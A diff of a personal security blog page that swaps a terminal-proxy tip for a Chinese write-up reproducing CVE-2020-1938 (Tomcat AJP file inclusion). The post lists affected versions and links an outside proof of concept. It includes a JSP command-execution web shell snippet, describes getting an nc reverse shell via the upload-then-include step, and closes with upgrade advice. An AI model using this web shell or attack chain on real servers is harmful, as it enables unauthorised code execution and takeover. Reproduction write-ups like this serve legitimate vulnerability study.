@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>两条命令给终端配置代理 | Mari0er&#39;s Blog</title>
+<title>CVE-2020-1938 Tomcat AJP复现 | Mari0er&#39;s Blog</title>
 <meta name="description" content="">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -98,49 +98,80 @@
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">两条命令给终端配置代理</h2>
-            <div class="post-date">2019-08-30</div>
+            <h2 class="post-title">CVE-2020-1938 Tomcat AJP复现</h2>
+            <div class="post-date">2020-04-09</div>
             
-              <div class="feature-container" style="background-image: url('https://raw.githubusercontent.com/mari0er/picture/master/0102/proxy1.png')">
+              <div class="feature-container" style="background-image: url('https://raw.githubusercontent.com/mari0er/picture/master/1010/tomcat-ghost.png')">
               </div>
             
             <div class="post-content">
-              <p>  电脑开了SS但是终端用不了，有时候想git东西比较缓慢,现在有了一个好的解决办法。</p>
+              <p>  2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
 <!-- more -->
-<p>Cmder几种终端模式命令如下：</p>
+<p>这里直接白嫖大佬的<a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC">POC</a>，简单复现记录一下，造轮子是不可能的!</p>
+<h3 id="0x01-搭建漏洞环境">0x01 搭建漏洞环境</h3>
+<p>根据官方说明此次受影响版本如下，登录Tomcat官网选择适合的版本<a href="https://archive.apache.org/dist/tomcat/">下载即可</a>搭建。</p>
 <blockquote>
-<p><strong>CMD模式</strong></p>
+<p>Apache Tomcat 9.x &lt; 9.0.31<br>
+Apache Tomcat 8.x &lt; 8.5.51<br>
+Apache Tomcat 7.x &lt; 7.0.100<br>
+Apache Tomcat 6.x</p>
 </blockquote>
-<pre><code>set http_proxy=http://127.0.0.1:1080
-set https_proxy=http://127.0.0.1:1080
+<h3 id="0x02-文件读取">0x02 文件读取</h3>
+<p>使用tomcat默认配置的情况下，可以直接读取tomcat目录文件，默认根目录为<strong>webapps/ROOT</strong>,test.txt为根目录下测试文件<br>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/1010/file_read.png" alt="file-read" loading="lazy"></p>
+<h3 id="0x03-文件包含rce">0x03 文件包含RCE</h3>
+<p>文件包含RCE需要先上传payload到tomcat目录。若上传一个jsp码到tomcat目录下，接着直接读取即可执行jsp代码。这里给一个简单的jsp码，补上你自己的利用代码即可。</p>
+<pre><code>&lt;%
+    java.io.InputStream in = Runtime.getRuntime().exec(&quot;补上利用代码&quot;).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print(&quot;&lt;pre&gt;&quot;);
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
+    out.print(&quot;&lt;/pre&gt;&quot;);
+%&gt;
 </code></pre>
-<blockquote>
-<p><strong>Bash模式,同样适用Kali和Mac</strong></p>
-</blockquote>
-<pre><code>export http_proxy=http://127.0.0.1:1080
-export https_proxy=http://127.0.0.1:1080
-</code></pre>
-<blockquote>
-<p><strong>Powershell模式</strong></p>
-</blockquote>
-<pre><code>$env:http_proxy=http://127.0.0.1:1080
-$env:https_proxy=http://127.0.0.1:1080
-</code></pre>
+<p>利用nc反弹shell为例，利用<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">在线payload生产器</a>可以快速生成利用代码，补在jsp码上即可。<br>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/1010/nc-e.png" alt="nc-e" loading="lazy"><br>
+上传到tomcat后直接读取shell.txt文件,可以解析为jsp文件执行。<br>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/1010/nc.png" alt="nc" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/mari0er/picture/master/1010/nc-l.png" alt="nc-l" loading="lazy"></figure>
+<h3 id="0x04-漏洞防护">0x04 漏洞防护</h3>
+<p>目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</p>
+<table>
+<thead>
+<tr>
+<th>版本号</th>
+<th style="text-align:center">下载地址</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache Tomcat 7.0.100</td>
+<td style="text-align:center">http://tomcat.apache.org/download-70.cgi</td>
+</tr>
+<tr>
+<td>Apache Tomcat 8.5.51</td>
+<td style="text-align:center">http://tomcat.apache.org/download-80.cgi</td>
+</tr>
+<tr>
+<td>Apache Tomcat 9.0.31</td>
+<td style="text-align:center">http://tomcat.apache.org/download-90.cgi</td>
+</tr>
+</tbody>
+</table>
 
             </div>
             
               <div class="tag-container">
                 
-                  <a href="https://mari0er.github.io/tag/ss/" class="tag">
-                    SS
+                  <a href="https://mari0er.github.io/tag/cve-2020-1938/" class="tag">
+                    CVE-2020-1938
                   </a>
                 
-                  <a href="https://mari0er.github.io/tag/cmder/" class="tag">
-                    Cmder
-                  </a>
-                
-                  <a href="https://mari0er.github.io/tag/dai-li/" class="tag">
-                    代理
+                  <a href="https://mari0er.github.io/tag/tomcat-ajp/" class="tag">
+                    tomcat ajp
                   </a>
                 
               </div>
@@ -148,9 +179,9 @@ $env:https_proxy=http://127.0.0.1:1080
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://mari0er.github.io/post/procdump.html/">
+                <a href="https://mari0er.github.io/post/nmap.html/">
                   <h3 class="post-title">
-                    简单两步抓取Windwos明文密码
+                    固定IP段之端口扫描
                   </h3>
                 </a>
               </div>
